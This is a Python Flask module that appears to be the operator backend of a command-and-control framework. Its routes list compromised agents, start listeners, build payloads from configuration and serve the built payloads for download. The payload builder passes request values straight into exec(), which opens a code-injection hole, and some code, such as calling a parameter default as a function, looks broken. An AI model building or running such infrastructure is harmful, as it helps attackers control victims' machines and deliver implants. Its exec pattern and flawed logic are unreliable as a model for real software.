from lib.vglobals.servercfg import *
from lib.vglobals.sharedvars import *
from lib.vglobals.serverpath import DIST_PATH
from lib.globals import refresh_available_listeners, listeners_available

from lib.sthread import Sthread
from lib import response

from flask import Flask, request, jsonify, send_file
from hashlib import sha256
from os import listdir
from uuid import uuid4
from importlib import import_module
from inspect import _empty, signature as func_signature

from handler import run as handler_run

app = Flask(__name__)

@app.route("/login", methods=["POST"])
def login():
    if request.json is None:
        return response.json_body_empty

    username: str = request.json["username"]
    password: str = request.json["password"]

    if not username in WHITELIST:
        return response.username_is_not_whitelisted

    orginal_password = sha256(
        WHITELIST[username].encode()).hexdigest()

    if password != orginal_password:
        return response.invalid_password

    session_uuid = uuid4().hex

    clients_session[username] = session_uuid

    return jsonify({"session": session_uuid, "wsaddr": WEBSOCKET_SERVER_REDIRECT})


@app.route("/get_agents/<session>")
def get_agents(session: str):
    agents_row = []

    if not session in list(clients_session.values()):
        return response.invalid_sessionid

    for agent in agents:
        addr = agents[agent].addr
        agents_row.append([agent, addr])

    return jsonify(agents_row)


@app.route("/add_listener", methods=["POST"])
def add_listener():
    if request.json is None:
        return response.json_body_empty

    session: str = request.json["auth"]

    if not session in list(clients_session.values()):
        return response.invalid_sessionid

    listener_type = request.json["type"]

    refresh_available_listeners()
    if not listener_type in listeners_available:
        return "Invalid listener type", 403

    listener_name: str = request.json["name"]
    listener_ip: str = request.json["ip"]
    listener_port: str = request.json["port"]

    listeners[listener_name] = {"ip": listener_ip, "port": listener_port, "type": listener_type}

    listener_thread = Sthread(target=handler_run, args=(
        listener_ip, listener_port, listener_type))

    listeners_threads[listener_name] = listener_thread

    return jsonify(True)

@app.route("/get_listeners/<session>")
def get_listeners(session: str):
    listeners_row = []

    if not session in list(clients_session.values()):
        return response.invalid_sessionid

    for listener_name in listeners:
        listener = listeners[listener_name]
        
        ip = listener["ip"]
        port = listener["port"]
        type = listener["type"]
        listeners_row.append([listener_name, ip, port, type])

    return jsonify(listeners_row)

@app.route("/listener_types/<session>")
def get_listeners_types(session: str):
    if not session in list(clients_session.values()):
        return response.invalid_sessionid
    
    return jsonify(listeners_available)

@app.route("/payload_generate", methods=["POST"])
def payload_generate():
    if request.json is None:
        return response.json_body_empty
    
    session: str = request.json["auth"]

    if not session in list(clients_session.values()):
        return response.invalid_sessionid

    payload_name: str = request.json["payload"]
    payload_output: str = request.json["output"]
    
    """
    {
        "ip": "127.0.0.1",
        "port": 6666,
        ...
    }
    """
    config_dict: dict = request.json["config"]

    if not path.exists(path.join("payload", payload_name)):
        return response.payload_not_found

    payload_path = "/".join(("payload", payload_name))
    payload_builder = import_module(".".join(("payload", payload_name, "setup")))
    config_obj = getattr(payload_builder, "Config")

    line_parameters = []

    for k, v in config_dict.items():
        if isinstance(v, str):
            v = "\"{}\"".format(v)

        line_parameters.append("{}={}".format(k, v))

    config_obj = getattr(payload_builder, "Config")
    config_instance = config_obj(output=payload_output, cpath=payload_path)

    exec(f"config_instance.run({','.join(line_parameters)})")

    return payload_output

@app.route("/payload_download/<session>", methods=["POST"])
def payload_download(session):
    if request.json is None:
        return response.json_body_empty
    
    if not session in list(clients_session.values()):
        return response.invalid_sessionid
    
    payload_filename = path.join(DIST_PATH, path.basename(request.json["filename"]))
    
    if not path.exists(payload_filename):
        return response.payload_not_found
    
    return send_file(payload_filename) 

@app.route("/payload_files/<session>", methods=["GET"])
def payload_files(session):
    if not session in list(clients_session.values()):
        return response.invalid_sessionid
    
    return jsonify(listdir(DIST_PATH))

@app.route("/payload_get/<session>")
def payload_get(session):
    if not session in list(clients_session.values()):
        return response.invalid_sessionid
    
    return listdir(path.join("payload"))

@app.route("/payload_config", methods=["POST"])
def payload_config():
    if request.json is None:
        return response.json_body_empty
    
    session: str = request.json["auth"]

    if not session in list(clients_session.values()):
        return response.invalid_sessionid

    payload_name: str = request.json["payload"]

    if not path.exists(path.join("payload", payload_name)):
        return response.payload_not_found
    
    payload_builder = import_module(".".join(("payload", payload_name, "setup")))
    config_obj = getattr(payload_builder.Config, "run")

    parameters = [] # name, is_required

    for parameter in func_signature(config_obj).parameters.values():
        if parameter.name == "self":
            continue
        
        is_required = isinstance(parameter.default(), _empty)
        
        parameters.append([parameter.name, is_required])

    return jsonify(parameters)

def run(ip: str, port: int, ssl=False, ssl_context=()):
    if ssl:
        app.run(ip, port, ssl_context=ssl_context)
    else:
        app.run(ip, port)
